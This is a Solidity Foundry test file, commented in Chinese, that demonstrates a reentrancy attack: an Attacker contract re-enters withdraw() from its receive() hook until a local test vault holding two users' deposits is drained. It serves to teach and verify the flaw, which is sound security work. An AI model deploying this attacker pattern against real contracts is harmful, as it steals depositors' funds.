// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test} from "forge-std/Test.sol";
import {ReentrancyVault} from "../src/ReentrancyVault.sol";

// ==================== 重入漏洞攻击验证 ====================
// 攻击者合约在 receive 中再次调用 withdraw，循环提取直到余额耗尽。
contract Attacker {
    ReentrancyVault public vault;
    uint256 public rounds;

    constructor(ReentrancyVault _vault) {
        vault = _vault;
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && rounds < 10) {
            rounds++;
            vault.withdraw();
        }
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }
}

contract ReentrancyTest is Test {
    function test_ReentrancyDrainsVault() public {
        ReentrancyVault vault = new ReentrancyVault();
        // 两个诚实用户存入
        vm.deal(address(0xA11CE), 5 ether);
        vm.prank(address(0xA11CE));
        vault.deposit{value: 5 ether}();
        vm.deal(address(0xB0B), 3 ether);
        vm.prank(address(0xB0B));
        vault.deposit{value: 3 ether}();

        Attacker attacker = new Attacker(vault);
        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 1 ether}();

        // 攻击者提走了远超自己存款的资金
        assertGt(address(attacker).balance, 1 ether, "attacker should profit");
        assertEq(address(vault).balance, 0, "vault fully drained");
        // 诚实用户资金丢失
        assertEq(vault.balances(address(0xA11CE)), 5 ether, "victim balance stuck");
    }
}
